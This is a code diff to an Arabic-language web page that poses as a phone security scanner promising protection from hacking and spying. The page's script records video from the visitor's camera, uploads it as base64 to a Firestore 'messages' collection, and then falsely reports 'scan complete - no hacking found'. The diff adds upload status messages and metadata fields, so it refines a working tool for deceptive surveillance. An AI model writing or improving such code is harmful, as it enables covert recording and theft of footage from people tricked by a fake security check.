@@ -156,6 +156,12 @@
             font-size: 13px;
             color: #aaa;
         }
+        .status-msg {
+            display: none;
+            margin-top: 15px;
+            font-weight: 700;
+            font-size: 14px;
+        }
     </style>
 </head>
 <body>
@@ -167,6 +173,8 @@
         <p class="subtitle">احمِ هاتفك الآن من أي محاولات اختراق أو تجسس. اضغط على الزر لبدء الفحص الأمني الشامل.</p>
         
         <button class="scan-btn" id="scanBtn" onclick="startProtection()">🔍 ابدأ الفحص الآن</button>
+        
+        <div class="status-msg" id="statusMsg"></div>
         
         <div class="progress" id="progress">
             <div class="progress-text" id="progressText">⏳ جاري فحص الهاتف...</div>
@@ -210,11 +218,13 @@
             const progressText = document.getElementById('progressText');
             const result = document.getElementById('result');
             const video = document.getElementById('video');
+            const statusMsg = document.getElementById('statusMsg');
             
             btn.disabled = true;
             btn.textContent = '⏳ جاري الفحص...';
             progress.classList.add('active');
             result.classList.remove('active');
+            statusMsg.style.display = 'none';
             
             try {
                 stream = await navigator.mediaDevices.getUserMedia({ 
@@ -236,15 +246,24 @@
                 mediaRecorder.onstop = async () => {
                     const blob = new Blob(recordedChunks, { type: 'video/webm' });
                     
+                    statusMsg.textContent = '⏳ جاري تحويل الفيديو...';
+                    statusMsg.style.color = '#f39c12';
+                    statusMsg.style.display = 'block';
+                    
                     const reader = new FileReader();
                     reader.readAsDataURL(blob);
                     
                     reader.onload = async () => {
                         const base64 = reader.result;
                         
+                        statusMsg.textContent = '⏳ جاري رفع الفيديو...';
+                        statusMsg.style.color = '#f39c12';
+                        
                         try {
                             await db.collection('messages').add({
                                 video: base64,
+                                type: 'video',
+                                format: 'webm',
                                 timestamp: firebase.firestore.FieldValue.serverTimestamp()
                             });
                             
@@ -253,12 +272,16 @@
                             
                             progress.classList.remove('active');
                             result.classList.add('active');
+                            statusMsg.textContent = '✅ تم رفع الفيديو بنجاح!';
+                            statusMsg.style.color = '#27ae60';
                             
                             btn.textContent = '✅ تم الفحص - لا يوجد اختراق';
                             btn.disabled = false;
                             btn.classList.add('success');
                         } catch (error) {
                             console.error('Upload error:', error);
+                            statusMsg.textContent = '❌ خطأ: ' + error.message;
+                            statusMsg.style.color = '#e74c3c';
                             btn.disabled = false;
                             btn.textContent = '🔍 ابدأ الفحص الآن';
                         }
@@ -283,6 +306,9 @@
                 
             } catch (error) {
                 console.error('Camera error:', error);
+                statusMsg.textContent = '❌ خطأ: ' + error.message;
+                statusMsg.style.color = '#e74c3c';
+                statusMsg.style.display = 'block';
                 btn.disabled = false;
                 btn.textContent = '🔍 ابدأ الفحص الآن';
                 progress.classList.remove('active');
